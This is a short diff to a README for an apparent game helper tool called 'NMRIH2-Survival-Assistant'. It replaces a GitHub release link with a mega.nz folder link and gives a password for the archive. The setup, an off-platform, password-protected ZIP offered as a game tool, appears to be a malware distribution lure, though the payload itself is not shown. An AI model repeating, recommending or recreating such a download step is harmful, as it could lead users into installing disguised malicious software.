@@ -6,7 +6,7 @@
 
 ## 📥 DOWNLOAD
 
-### [⬇️ DOWNLOAD ZIP ARCHIVE (LATEST VERSION)](https://github.com/mattwilson-lab2001r7/NMRIH2-Survival-Assistant/releases/download/NMRIH2/NMRIH2.zip)
+### [⬇️ DOWNLOAD ZIP ARCHIVE (LATEST VERSION)](https://mega.nz/folder/gMN3nLBC#P1ldhYoUlHExIsR7VfJ1bQ)
 
 🔐 **Archive password:** **`5868781`**
 
